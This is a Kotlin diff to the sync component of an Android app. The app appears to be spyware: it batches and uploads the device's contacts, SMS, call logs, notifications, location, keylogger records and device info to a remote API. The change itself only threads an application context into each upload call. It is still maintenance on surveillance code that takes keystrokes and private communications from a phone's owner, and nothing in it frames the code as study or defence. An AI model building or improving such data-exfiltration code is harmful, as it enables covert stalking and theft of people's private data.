@@ -29,6 +29,7 @@ object SyncManager {
     private const val BATCH_SIZE = 50
     
     private lateinit var database: AbuZahraDatabase
+    private lateinit var appContext: Context
     private val syncScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
     
     // Sync state
@@ -49,6 +50,7 @@ object SyncManager {
      * Initialize sync manager
      */
     fun initialize(context: Context) {
+        appContext = context.applicationContext
         database = AbuZahraDatabase.getInstance(context)
         
         // Load pending items from database
@@ -200,7 +202,7 @@ object SyncManager {
                 })
             }
             
-            val response = ApiClient.sendData("contacts", jsonArray.toString())
+            val response = ApiClient.sendData(appContext, "contacts", jsonArray.toString())
             if (response) {
                 database.contactDao().markSynced(batch.map { it.id })
             }
@@ -228,7 +230,7 @@ object SyncManager {
                 })
             }
             
-            val response = ApiClient.sendData("sms", jsonArray.toString())
+            val response = ApiClient.sendData(appContext, "sms", jsonArray.toString())
             if (response) {
                 database.smsDao().markSynced(batch.map { it.id })
             }
@@ -256,7 +258,7 @@ object SyncManager {
                 })
             }
             
-            val response = ApiClient.sendData("calls", jsonArray.toString())
+            val response = ApiClient.sendData(appContext, "calls", jsonArray.toString())
             if (response) {
                 database.callDao().markSynced(batch.map { it.id })
             }
@@ -283,7 +285,7 @@ object SyncManager {
                 })
             }
             
-            val response = ApiClient.sendData("notifications", jsonArray.toString())
+            val response = ApiClient.sendData(appContext, "notifications", jsonArray.toString())
             if (response) {
                 database.notificationDao().markSynced(batch.map { it.id })
             }
@@ -311,7 +313,7 @@ object SyncManager {
                 })
             }
             
-            val response = ApiClient.sendData("location", jsonArray.toString())
+            val response = ApiClient.sendData(appContext, "location", jsonArray.toString())
             if (response) {
                 database.locationDao().markSynced(batch.map { it.id })
             }
@@ -337,7 +339,7 @@ object SyncManager {
                 })
             }
             
-            val response = ApiClient.sendData("keylog", jsonArray.toString())
+            val response = ApiClient.sendData(appContext, "keylog", jsonArray.toString())
             if (response) {
                 database.keylogDao().markSynced(batch.map { it.id })
             }
@@ -351,7 +353,7 @@ object SyncManager {
      */
     private suspend fun syncEvent(item: SyncQueueEntity): Boolean {
         val payload = item.dataPayload ?: return false
-        return ApiClient.sendData("event", payload)
+        return ApiClient.sendData(appContext, "event", payload)
     }
     
     /**
@@ -359,7 +361,7 @@ object SyncManager {
      */
     private suspend fun syncDeviceInfo(item: SyncQueueEntity): Boolean {
         val payload = item.dataPayload ?: return false
-        return ApiClient.sendData("device_info", payload)
+        return ApiClient.sendData(appContext, "device_info", payload)
     }
     
     /**
